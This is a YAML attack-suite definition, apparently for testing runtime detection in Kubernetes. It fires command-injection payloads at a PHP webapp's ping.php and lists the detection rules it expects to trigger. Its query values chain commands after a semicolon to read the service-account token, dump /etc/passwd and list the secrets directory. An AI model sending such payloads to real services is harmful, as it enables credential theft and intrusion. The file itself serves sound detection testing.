apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: webapp-attacks
  description: >-
    Attack suite for the PHP webapp. The webapp has a single vulnerability:
    command injection via ping.php's "ip" parameter (semicolon injection).
    There is NO LFI, SSRF, or SQLi vulnerability in this webapp.
target:
  service: webapp-mywebapp
  namespace: webapp
  port: 8080

attacks:
  # --- Command Injection (via ping.php) ---
  # The ping.php page executes `ping -c1 $ip` without sanitising the ip
  # parameter. Semicolons let us chain arbitrary commands.

  - name: cmdinject-sa-token
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "1.1.1.1;cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    successIndicators:
      - bodyContains: "eyJ"

  - name: cmdinject-etc-passwd
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "1.1.1.1;cat /etc/passwd"
    successIndicators:
      - bodyContains: "root:"

  - name: cmdinject-whoami
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "1.1.1.1;whoami"
    successIndicators:
      - bodyContains: "www-data"

  - name: cmdinject-ls-secrets
    type: cmdinject
    http:
      method: GET
      path: /ping.php
      queryParams:
        ip: "1.1.1.1;ls /var/run/secrets/kubernetes.io/serviceaccount/"
    successIndicators:
      - bodyContains: "token"

expectedDetections:
  # cat /etc/passwd and cat SA token both spawn "cat" — unexpected process
  - attackType: cmdinject
    ruleID: R0001
    ruleName: "Unexpected process launched"
    containerName: mywebapp-app
    command: cat

  # cat SA token also triggers the dedicated SA token rule
  - attackType: cmdinject
    ruleID: R0006
    ruleName: "Unexpected Service Account Token Access"
    containerName: mywebapp-app
    command: cat
